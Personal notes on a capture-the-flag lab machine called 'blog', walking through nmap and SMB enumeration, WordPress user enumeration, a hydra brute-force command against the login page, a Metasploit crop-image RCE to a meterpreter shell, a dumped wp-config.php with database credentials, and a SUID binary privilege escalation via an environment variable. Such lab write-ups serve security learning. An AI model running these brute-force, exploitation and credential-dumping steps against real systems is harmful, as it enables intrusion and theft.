---
title: blog
tags:
  - fetus
---
## nmap results:
- `nmap -p- -Pn -sV -O -T4 10.10.76.139`:
```sh fold title:"nmap -p- -Pn -sV -O -T4 10.10.76.139"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 04:04 EDT
Warning: 10.10.76.139 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.76.139
Host is up (0.21s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1040.13 seconds
```
	
- `nmap -p- -Pn -A -T4 10.10.76.139`:
```sh fold title:"nmap -p- -Pn -A -T4 10.10.76.139"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 03:36 EDT
Warning: 10.10.76.139 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.76.139
Host is up (0.20s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-generator: WordPress 5.0
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2025-03-25T07:54:37+00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-03-25T07:54:37
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 1s, median: -1s

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   270.19 ms 10.21.0.1
2   270.27 ms 10.10.76.139

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1093.43 seconds
```
	
## [[smb]] enumeration: 
- `nmap --script=*smb* 10.10.76.139 -p 139,445`:
```sh fold title:"nmap --script=*smb* 10.10.76.139 -p 139,445"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 04:26 EDT
Nmap scan report for 10.10.76.139
Host is up (0.22s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-brute: 
|_  No accounts found
|_smb-system-info: ERROR: Script execution failed (use -d to debug)
| smb-enum-sessions: 
|_  <nobody>
| smb2-capabilities: 
|   2:0:2: 
|     Distributed File System
|   2:1:0: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3:0:0: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3:0:2: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3:1:1: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
| smb2-time: 
|   date: 2025-03-25T08:26:56
|_  start_date: N/A
|_smb-flood: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-061: false
| smb-ls: Volume \\10.10.76.139\BillySMB
| SIZE     TIME                 FILENAME
| <DIR>    2025-03-25T08:34:18  .
| <DIR>    2020-05-26T17:58:23  ..
| 33378    2020-05-26T18:17:01  Alice-White-Rabbit.jpg
| 1236733  2020-05-26T18:13:45  tswift.mp4
| 3082     2020-05-26T18:13:43  check-this.png
|_
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.76.139\BillySMB: 
|     Type: STYPE_DISKTREE
|     Comment: Billy's local SMB Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\smb\files
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.76.139\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (blog server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.76.139\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2025-03-25T08:31:58+00:00
| smb-mbenum: 
|   DFS Root
|     BLOG  0.0  blog server (Samba, Ubuntu)
|   Master Browser
|     BLOG  0.0  blog server (Samba, Ubuntu)
|   Print server
|     BLOG  0.0  blog server (Samba, Ubuntu)
|   Server
|     BLOG  0.0  blog server (Samba, Ubuntu)
|   Server service
|     BLOG  0.0  blog server (Samba, Ubuntu)
|   Unix server
|     BLOG  0.0  blog server (Samba, Ubuntu)
|   Windows NT/2000/XP/2003 server
|     BLOG  0.0  blog server (Samba, Ubuntu)
|   Workstation
|_    BLOG  0.0  blog server (Samba, Ubuntu)
|_smb-vuln-ms10-054: false
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1
|_smb-print-text: false
| smb-enum-domains: 
|   Builtin
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|     Account lockout disabled
|   BLOG
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|_    Account lockout disabled
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 519.16 seconds
```
	
- did `smbclient -L ////blog.thm// -N` to list out available shares as well 
```sh
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BLOG
```
	
- did `smbclient \\\\blog.thm\\BillySMB` and got in. got 3 files using get 
```
smb: \> ls
  .                                   D        0  Tue May 26 14:17:05 2020
  ..                                  D        0  Tue May 26 13:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 14:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 14:13:45 2020
  check-this.png                      N     3082  Tue May 26 14:13:43 2020
```
	
- `check-this.png`: <br>
![[blogCheckThis.png]]
- scanned it and got `https://qrgo.page.link/M6dE` which leads to `https://www.youtube.com/watch?v=eFTLKWw542g` 
- `Alice-White-Rabbit.jpg` seemed innocent enough but when i ran it through steghide it said it was a rabbit hole lmao. gonna do http enum now

## http enum:
- added `blog.thm` to the `/etc/hosts` file first to get the cms working
- possible unames: 
```
billy joel
Billy
karen wheeler
```
	
- `/robots.txt` is accessible:
```sh
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```
	
- `/wp-admin/admin-ajax.php` was blank. theres just a `0` in there and nothing else
- dont have the creds for `/wp-admin/` yet. can try bruteforcing with rockyou ig
### dirbusting results: 
- used ffuf 
```
/
login 
rss 
feed
atom
wp-content
welcome
admin
w
n
rss2
wp-includes
no
N
W
rdf
page1
Welcome 
'
dashboard
note 
%20
we
2020 
wp-admin
```
### [[wpscan]] stuff:
- did some wordpress scanning with [[wpscan]] 
- `wpscan --url http://blog.thm/ -e vt,vp`:
```sh fold title:"wpscan --url http://blog.thm/ -e vt,vp"
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.thm/ [10.10.40.136]
[+] Started: Wed Mar 26 09:55:52 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:36 <============================================================================> (652 / 652) 100.00% Time: 00:00:36
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Mar 26 09:56:39 2025
[+] Requests Done: 684
[+] Cached Requests: 9
[+] Data Sent: 172.621 KB
[+] Data Received: 560.268 KB
[+] Memory used: 265.516 MB
[+] Elapsed time: 00:00:47
```
- themes: 
```sh fold title:"themes"
[i] Theme(s) Identified:

[+] twentynineteen
 | Location: http://blog.thm/wp-content/themes/twentynineteen/
 | Last Updated: 2024-11-12T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://blog.thm/wp-content/themes/twentynineteen/style.css
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blog.thm/wp-content/themes/twentynineteen/, status: 500
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentynineteen/style.css, Match: 'Version: 1.5'

[+] twentyseventeen
 | Location: http://blog.thm/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-11-12T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.8
 | Style URL: http://blog.thm/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blog.thm/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 2.3'

[+] twentysixteen
 | Location: http://blog.thm/wp-content/themes/twentysixteen/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 3.4
 | Style URL: http://blog.thm/wp-content/themes/twentysixteen/style.css
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blog.thm/wp-content/themes/twentysixteen/, status: 500
 |
 | Version: 2.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentysixteen/style.css, Match: 'Version: 2.1'

[+] twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Known Locations (Aggressive Detection)
 |   - http://blog.thm/wp-content/themes/twentytwenty/, status: 500
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css, Match: 'Version: 1.3'
```
- users: 
```sh fold title:"users"
[i] User(s) Identified:

[+] bjoel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] kwheel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Aggressive Detection)
```
- updated unames:
```
bjoel 
kwheel 
Karen Wheeler 
Billy Joel
```
- idk what to do now. gonna check the vid 
- checked `http://blog.thm/wp-login.php` and seems like the first two unames are correct/usable
- usable unames: 
```
bjoel 
kwheel
```
- did `wpscan --url http://blog.thm/ -U unames.txt -P /usr/share/wordlists/rockyou.txt` to bruteforce the unames
- its very slow. im just gonna use the attackbox. doesnt fucking work. ig ill let it run and see if i can find anything else 
- seems like theres a bunch of stuff on `wordpress 5.0` imma try em out
- shit needs password. ig ill let it run for now
- found a pass for kwheel its `cutiepie1`
- im gonna test around in the editor 
- doesnt seem like theres any XSS <br>
![[blogXSSfailed.png]]
- i dont really have any image webshells on hand rn
- ig ill go back to metasploit 
- yay `multi/http/wp_crop_rce` dropped me into a `meterpreter` shell
### hydra enum 
```
hydra -L unames.txt -P /usr/share/wordlists/rockyou.txt blog.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered" -I -t 54 -v
```
<br>
![[blogMeterpreter.png]]
- catted the `wp-config.php` 
```
meterpreter > cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

/* Custom */
/*
define('WP_HOME', '/');
define('WP_SITEURL', '/'); */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'blog');

/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'LittleYellowLamp90!@');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/** Custom FS Method */
define('FS_METHOD', 'direct');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'ZCgJQaT0(*+Zjo}Iualapeo|?~nMtp^1IUrquYx3!#T$ihW8F~_`L+$N E>J!Bm;');
define('SECURE_AUTH_KEY',  'nz|(+d|| yVX-5_on76q%:M, ?{NVJ,Q(;p3t|_B*]-yQ&|]3}M@Po!f_,T-S4fe');
define('LOGGED_IN_KEY',    'a&I&DR;PUnPKul^kLBgxYa@`g||{eZf><sf8SmKBi+R7`O?](SuL&/H#hqzO$_:3');
define('NONCE_KEY',        'Vdd-zzB:/yxg6unZvng,oY-%Z V,i%+Uz_f)S;Efz!;cY3p~]T,g1z*Z[jXe>5Sm');
define('AUTH_SALT',        'u+k8g;=jbe)6/X~<M1HwINhH(Tno@orx:$_$-#*id)ddBYGGF(]AP?}4?2E|m;5`');
define('SECURE_AUTH_SALT', '>Rg5>,/^BywVg^A[Etqot:CoU+9<)YPM~h|)Ifd5!iK!L*5+JDiZi33KrYZNd2B7');
define('LOGGED_IN_SALT',   '3kpL-rcnU+>H#t/g>9<)j/u I1/-Ws;h6GrDQ>v8%7@C~`h1lBC/euttp)/8EdA_');
define('NONCE_SALT',       'JEajZ)y?&.m-1^$(c-JX$zi0qv|7]F%7a6jh]P5SRs+%`*60?WJVk$><b$poQg9>');


/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
```
- [[mysql]] creds:
```
wordpressuser:LittleYellowLamp90!@
```
- `ltrace`
- path: `/usr/sbin/checker` 

---
- lxc 
- lxd 
- smb escapinh
- xxd
- strings
- tcpdump
```sh title:"before"
www-data@blog:/tmp$ ltrace /usr/sbin/checker     
ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++
```

```sh title:"after"
www-data@blog:/tmp$ ltrace /usr/sbin/checker
ltrace /usr/sbin/checker
getenv("admin")                                  = "test"
setuid(0)                                        = -1
system("/bin/bash"
```
- check how this works
- db access
- shuvo ahmed sanim